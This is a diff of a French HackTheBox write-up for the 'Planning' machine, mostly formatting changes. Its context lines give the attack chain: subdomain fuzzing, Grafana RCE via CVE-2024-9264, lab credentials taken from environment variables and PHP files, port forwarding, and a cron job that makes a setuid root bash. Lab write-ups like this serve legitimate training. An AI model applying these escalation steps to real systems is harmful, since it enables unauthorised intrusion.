@@ -1,7 +1,14 @@
 ---
 title: Planning
 date: 2025-07-26
-tags: [Remote code execution, privilege-escalation, subdomain-enumeration, port-forwarding]
+tags:
+  [
+    nmap,
+    Remote code execution,
+    privilege-escalation,
+    subdomain-enumeration,
+    port-forwarding,
+  ]
 draft: false
 summary: Cette machine HTB présente un scénario réaliste où l'attaquant doit découvrir un sous-domaine caché, exploiter une CVE pour RCE puis escalader les privilèges via crontab.
 images: ["/static/images/planning/logo.png"]
@@ -19,6 +26,7 @@ images: ["/static/images/planning/logo.png"]
 ## Résumé de l'Exploitation
 
 Cette machine HTB présente un scénario réaliste où l'attaquant doit :
+
 1. Découvrir un sous-domaine caché hébergeant Grafana
 2. Exploiter une CVE récente (CVE-2024-9264) pour RCE
 3. Sortir du conteneur Docker en récupérant des credentials
@@ -35,6 +43,7 @@ nmap -sC -sV 10.10.11.68
 ```
 
 **Résultats :**
+
 - **Port 22** : SSH OpenSSH
 - **Port 80** : HTTP nginx/1.24.0 (Ubuntu)
 
@@ -51,6 +60,7 @@ feroxbuster -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -x ph
 ```
 
 **Pages découvertes :**
+
 - `/index.php` - Page d'accueil avec formulaire de recherche
 - `/enroll.php` - Formulaire d'inscription
 - `/contact.php` - Formulaire de contact
@@ -59,11 +69,13 @@ feroxbuster -u http://planning.htb -w /usr/share/wordlists/dirb/common.txt -x ph
 ### Tests de Sécurité sur l'Application Web
 
 #### Formulaires testés :
+
 1. **Recherche** (`/index.php`) - Paramètre `keyword`
 2. **Inscription** (`/enroll.php`) - Paramètres `full_name`, `email`, `phone`
 3. **Contact** (`/contact.php`) - Formulaire de contact
 
 #### Vulnérabilités testées sans succès :
+
 - Injection SQL sur tous les formulaires
 - XSS (Cross-Site Scripting)
 - Directory Traversal / LFI
@@ -88,6 +100,7 @@ ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" \
 ```
 
 **Résultat crucial :**
+
 ```
 grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3]
 ```
@@ -107,6 +120,7 @@ echo "10.10.11.68    planning.htb grafana.planning.htb" >> /etc/hosts
 **URL** : `http://grafana.planning.htb`
 
 **Identifiants** :
+
 - Username : `admin`
 - Password : `0D5oT70Fq13EvB5r`
 
@@ -157,6 +171,7 @@ env | grep -i GF_
 ```
 
 **Découvertes cruciales :**
+
 ```
 GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
 GF_SECURITY_ADMIN_USER=enzo
@@ -196,6 +211,7 @@ netstat -tulpn | grep 127
 ```
 
 **Services internes découverts :**
+
 - Port 3306 : MySQL
 - Port 3000 : Grafana
 - Port 8000 : Service mystérieux
@@ -209,10 +225,11 @@ find /var/www -name "*.php" -exec grep -l "mysql\|database\|password" {} \;
 ```
 
 **Découverte dans `/var/www/web/enroll.php` :**
+
 ```php
-$servername = "localhost"; 
+$servername = "localhost";
 $username = "root";
-$password = "EXTRapHY"; 
+$password = "EXTRapHY";
 $dbname = "edukate";
 ```
 
@@ -223,6 +240,7 @@ cat /opt/crontabs/crontab.db
 ```
 
 **Contenu critique :**
+
 ```json
 {
   "name":"Grafana backup",
@@ -237,6 +255,7 @@ cat /opt/crontabs/crontab.db
 ```
 
 **Mots de passe trouvés :**
+
 - `EXTRapHY` (MySQL root)
 - `P4ssw0rdS0pRi0T3c` (ZIP backup)
 
@@ -256,6 +275,7 @@ curl -v http://root:P4ssw0rdS0pRi0T3c@localhost:8000
 **Méthode d'escalade :**
 
 #### Port Forwarding + Interface Web
+
 ```bash
 # Sur votre machine locale
 ssh -L 8000:localhost:8000 enzo@10.10.11.68
@@ -266,6 +286,7 @@ http://localhost:8000/
 ```
 
 **Configuration de la tâche malveillante :**
+
 - **Name :** RootShell
 - **Command :** `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`
 - **Schedule :** `* * * * *` (chaque minute)
@@ -350,6 +371,7 @@ curl -v http://user:pass@localhost:port
 ## Conclusion
 
 La machine Planning illustre parfaitement l'importance de :
+
 - L'énumération complète (sous-domaines, services internes)
 - La veille sur les CVE récentes
 - L'analyse minutieuse des configurations et variables d'environnement
